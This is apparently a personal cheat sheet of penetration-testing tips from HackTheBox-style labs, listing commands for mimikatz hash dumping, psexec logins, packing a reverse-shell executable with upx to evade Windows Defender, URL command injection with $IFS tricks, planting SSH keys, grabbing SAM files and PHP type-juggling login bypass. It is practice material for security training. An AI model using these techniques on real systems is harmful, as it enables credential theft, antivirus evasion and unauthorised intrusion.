1. Run exploit manually two times min cuz there is a change the it wont work in first go.
2. Use `mimkatz` to dump hashes in the windows 
	Command : `lsadump::sam`
3. Finding Flags `dir *flag*.txt /s`
4. If you have to write in folder that you can access from web then you can get reverse shell Ex: SMB,FTP,etc
5. If you find 111 open then there is chances of NFS running also nmap with nse for nfs on 111 and 2049 or do manually.
6. For Windows If we have valid credentials of system then we can do psexec64.py to get into system  
	```bash
	psexec64.py user:password@target-IP
	```
7. If WinPEAS.exe doesnt work then go with WinPEAS.bat
8. Cap transmission hit error in nmap on ports then reduce the min rate.
9. If have ``/cgi-bin/`` directory then search for files having extensions ``-x sh,pl,cgi``
10. If you face windows defender problem in script execution (Windows) then use `upx -9 rev.exe` command in kali then downlaod it.
11. During Dirsearch if you find nothing then try with `-b` option to skip SSL certificate 

1. Gobuster / Content Discovery TIP:
	1. If you encounter directory like `/cgi-bin/` then bute again with extensions `-x sh,pl,cgi`
	2. If you encounter server running pfsense or any similar webapp then use extenstions `-x txt,php,html`
	3. `-b` in dirsearch and `-k` in Gobuster for ignoring SSL certificate.

13. Try everything you are thingking of



14. Doctor HTB
	- If you found any endpoint that isnt working and have login functionality then login and then try to access it. [See Command injection as a endpoint](https://0xdf.gitlab.io/2021/02/06/htb-doctor.html#via-command-injection)
	- *From Doctor* If you see that webapp is curling your server then try executing commands by using \$(command) in the url Ex: http://10.10.14.14/$(id), you will see the id command ouput in request
	- After executing command Bash URL encoding we can use $IFS vairable 
		- Ex: ``echo$IFS'test'`` will decoded as `echo 'test'` > `test`

	- If you can run command on victim machine then make your ssh keys in his home folder.

15. If you encounter a **Password** and **SSH** is enabled then try login into the user.
16. Burp ka URL encode is Chutiya.

17. Aviable foreign port to our local machine using ssh 
	```bash
	ssh -L 5050:127.0.0.1:21 admin@10.10.10.90
	```
	
18. **If access to directory is forbidden `401` then try dirsearch cuz then maybe you might have access to the content behind the wall**

19. Shell confirmation `tcpdump -i tun0 icmp`  and use ping command in target machine.



20. During shell if `whoami` not getting execute then try `cmd /c whoami` **Windows Tip**

-----
21. If you have Remote code execution and unable to get the reverse shell then try to fetch the SAM,SYSTEM,SECURITY file.

----

**User ACL file permission**
- a `+` sign can be seen if ACL is implemented on any file.
	- Ex: drwxrwx---+
	- In that case we will use the `getfacl /usr/local/monitoring` command to get the info abt ACL.

22. If server has SNMP enabled then possible that the root you might get is from `snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects` [HTB pit]

23. [mysql] If dont have client binary then dump the database from `mysqldump`
24. If you see Login Page and tested for SQLi then go with NoSQLi injection also.

---

25. If you encounter API in the webapp then navigate to 'Debugger' tab of the broweser and open the 'Controllers' and 'app.js' for getting info about endpoints enum.

---

26. Just overwrite the file if you cant remove it

---

27. Check for Type juggling on the login pages in PHP.
 change the request to 
```txt
# from

username=admin&password=

# to

 username=admin&password[]= 

```

---

28. MOTD service can be used to escalate privileges in linux.